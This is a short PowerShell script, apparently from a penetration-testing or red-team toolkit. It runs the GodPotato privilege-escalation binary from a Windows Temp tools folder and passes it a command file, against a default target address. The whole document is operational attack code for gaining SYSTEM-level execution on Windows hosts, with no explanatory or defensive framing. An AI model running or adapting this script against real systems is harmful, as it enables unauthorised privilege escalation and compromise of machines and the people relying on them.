[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Target = "192.168.77.22"
)
$ErrorActionPreference = "Stop"
$gp = "C:\Windows\Temp\cadre-tools\GodPotato.exe"
$cmd = "C:\Windows\Temp\cadre-tools\gp.cmd"
if (-not (Test-Path $gp)) { throw "GodPotato not found on $Target" }
& $gp -cmd $cmd
